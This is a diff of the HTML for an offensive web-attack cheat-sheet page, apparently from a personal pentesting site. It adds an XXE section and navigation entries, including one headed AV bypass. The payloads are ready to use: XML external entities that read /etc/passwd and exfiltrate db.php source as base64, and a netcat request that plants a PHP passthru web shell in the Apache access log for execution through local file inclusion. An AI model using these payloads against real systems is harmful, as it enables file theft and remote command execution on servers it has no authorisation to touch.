@@ -3,21 +3,21 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content=" XML External Entity (XXE) # Read local files
+<meta name="description" content="XML External Entity (XXE) # Read local files
 &lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt; &lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt; &lt;foo&gt; &lt;something&gt;&amp;xxe;&lt;/something&gt; &lt;/foo&gt; Read binary or files that otherwise can&rsquo;t be display (.php)
 &lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt; &lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=db.php&#34;&gt;]&gt; &lt;foo&gt; &lt;something&gt;&amp;xxe;&lt;/something&gt; &lt;/foo&gt; LFI via nc # logfile injection
 nc target-ip target-port GET /&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt; HTTP/1.1 Host: &lt;IP&gt; Connection: close Afterwards include the it via lfi
-?lfi_file=/var/log/apache2/access.log&amp;cmd=&lt;command&gt; ">
+?lfi_file=/var/log/apache2/access.log&amp;cmd=&lt;command&gt; XML External Entity (XXE) # Read local files">
 <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
 <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
 <meta name="color-scheme" content="light dark"><meta property="og:url" content="https://www.tagnull.de/docs/Cheatsheet/initial-access/web/">
   <meta property="og:site_name" content="www.tagnull.de">
   <meta property="og:title" content="web">
-  <meta property="og:description" content=" XML External Entity (XXE) # Read local files
+  <meta property="og:description" content="XML External Entity (XXE) # Read local files
 &lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt; &lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt; &lt;foo&gt; &lt;something&gt;&amp;xxe;&lt;/something&gt; &lt;/foo&gt; Read binary or files that otherwise can’t be display (.php)
 &lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt; &lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=db.php&#34;&gt;]&gt; &lt;foo&gt; &lt;something&gt;&amp;xxe;&lt;/something&gt; &lt;/foo&gt; LFI via nc # logfile injection
 nc target-ip target-port GET /&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt; HTTP/1.1 Host: &lt;IP&gt; Connection: close Afterwards include the it via lfi
-?lfi_file=/var/log/apache2/access.log&amp;cmd=&lt;command&gt; ">
+?lfi_file=/var/log/apache2/access.log&amp;cmd=&lt;command&gt; XML External Entity (XXE) # Read local files">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="docs">
@@ -27,7 +27,7 @@ nc target-ip target-port GET /&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt; HTT
 <link rel="canonical" href="https://www.tagnull.de/docs/Cheatsheet/initial-access/web/">
 <link rel="stylesheet" href="/book.min.aaab74181c6b1b4045b90f1cce4aaa1631e06c4b04ec2890a00c5723953b070a.css" integrity="sha256-qqt0GBxrG0BFuQ8czkqqFjHgbEsE7CiQoAxXI5U7Bwo=" crossorigin="anonymous">
   <script defer src="/fuse.min.js"></script>
-  <script defer src="/en.search.min.2323b3bb3c0c7c6758b4a4ad8d0d6d2f21440a0a4886e59ff5fe292f37603e23.js" integrity="sha256-IyOzuzwMfGdYtKStjQ1tLyFECgpIhuWf9f4pLzdgPiM=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.2e50a8bec8fd3cbe3569e29452a4e60825c7d8e7f03f3bf38b10781d66c15512.js" integrity="sha256-LlCovsj9PL41aeKUUqTmCCXH2OfwPzvzixB4HWbBVRI=" crossorigin="anonymous"></script>
 
   
 
@@ -88,40 +88,6 @@ https://github.com/alex-shpak/hugo-book
 
           
   <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-d7b6e2b3b2bd9f24f70a74fad4ae1939" class="toggle"  />
-    <label for="section-d7b6e2b3b2bd9f24f70a74fad4ae1939" class="flex justify-between">
-      <a role="button" class="">Collection</a>
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/Cheatsheet/collection/mail/" class="">mail</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
     
       
         <li>
@@ -302,6 +268,40 @@ https://github.com/alex-shpak/hugo-book
   
 
   
+    <input type="checkbox" id="section-d7b6e2b3b2bd9f24f70a74fad4ae1939" class="toggle"  />
+    <label for="section-d7b6e2b3b2bd9f24f70a74fad4ae1939" class="flex justify-between">
+      <a role="button" class="">Collection</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/collection/mail/" class="">mail</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
     <input type="checkbox" id="section-73088f9e1c7f62d1ff61f2cb6b3a8135" class="toggle"  />
     <label for="section-73088f9e1c7f62d1ff61f2cb6b3a8135" class="flex justify-between">
       <a role="button" class="">Lateral Movement</a>
@@ -353,6 +353,40 @@ https://github.com/alex-shpak/hugo-book
 
   
     <a href="/docs/Cheatsheet/active-directory/discovery/" class="">discovery</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-1e75615556d5887423d6562f3883a23d" class="toggle"  />
+    <label for="section-1e75615556d5887423d6562f3883a23d" class="flex justify-between">
+      <a role="button" class="">Av Bypass</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/av-bypass/reflective-code-loading/" class="">reflective code loading</a>
   
 
         </li>
@@ -724,6 +758,24 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>Connection: close
 </span></span></code></pre></div><p>Afterwards include the it via lfi</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>?lfi_file<span style="color:#f92672">=</span>/var/log/apache2/access.log&amp;cmd<span style="color:#f92672">=</span>&lt;command&gt;
+</span></span></code></pre></div><hr>
+<h1 id="xml-external-entity-xxe-1">
+  XML External Entity (XXE)
+  <a class="anchor" href="#xml-external-entity-xxe-1">#</a>
+</h1>
+<hr>
+<p>Read local files</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>]&gt;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;foo&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;something&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/something&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;/foo&gt;</span>
+</span></span></code></pre></div><p>Read binary or files that otherwise can&rsquo;t be display (.php)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=db.php&#34;&gt;</span>]&gt;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;foo&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;something&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/something&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;/foo&gt;</span>
 </span></span></code></pre></div><hr>
 </article>
  
